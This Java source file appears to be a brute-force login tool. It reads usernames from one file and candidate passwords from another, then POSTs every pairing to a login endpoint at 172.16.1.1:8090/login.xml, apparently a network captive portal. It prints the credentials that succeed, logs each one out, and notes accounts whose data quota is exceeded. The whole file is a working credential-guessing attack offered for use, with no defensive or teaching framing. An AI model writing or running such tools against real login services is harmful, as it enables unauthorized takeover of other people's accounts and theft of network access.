package post;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SendPost {
	private final static String USER_AGENT = "Mozilla/5.0";
	static String apiEndpoint=null;
	static String params=null;

	public static void main(String asdf[]) throws Exception {
		
		BufferedReader usr=new BufferedReader(new FileReader("username.txt"));
		BufferedReader pass=new BufferedReader(new FileReader("password.txt"));
		String username;
		String password;
		String response;
		while((username=usr.readLine()) != null) {
			password=username;
			pass=new BufferedReader(new FileReader("password.txt"));
					
			while(password!=null) {
				apiEndpoint="http://172.16.1.1:8090/login.xml";
				params="mode=191&username="+username+"&password="+password+"&a="+System.currentTimeMillis()+"&producttype=0";
				response=postMethod(apiEndpoint,params);
				if(response.contains("logged in")) {					
					System.out.println(username+"\t"+password);
					apiEndpoint="http://172.16.1.1:8090/logout.xml";
					params="mode=193&username="+username+"&a="+System.currentTimeMillis()+"&producttype=0";
					postMethod(apiEndpoint,params);					
				}
				else if (response.contains("exceeded")) {
					System.out.println(username+"\t"+password+"data exceeded");
				}
				password=pass.readLine();	
			}	
			pass.close();
		}	
	}
	private static String postMethod(String apiEndpoint,String params) throws Exception {
		URL obj = new URL(apiEndpoint);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("POST");
		
		con.setRequestProperty("User-Agent", USER_AGENT);
		con.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
		con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
				
		con.setRequestProperty( "charset", "utf-8");
		con.setRequestProperty( "Content-Length", Integer.toString( params.length() ));
		con.setUseCaches( false );

		
		// Send post request
		con.setDoOutput(true);
		DataOutputStream wr = new DataOutputStream(con.getOutputStream());
		wr.writeBytes(params);
		wr.flush();
		wr.close();

		 String urlPsarameters ="fName=" + URLEncoder.encode("???", "UTF-8") +"&lName=" + URLEncoder.encode("???", "UTF-8");
		
		int responseCode = con.getResponseCode();
//		System.out.println("\nSending 'POST' request to URL : " + apiEndpoint);
//		System.out.println("Post parameters : " + params);
//		System.out.println("Response Code : " + responseCode);

		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}

		in.close();
		return response.toString();
	}	
}

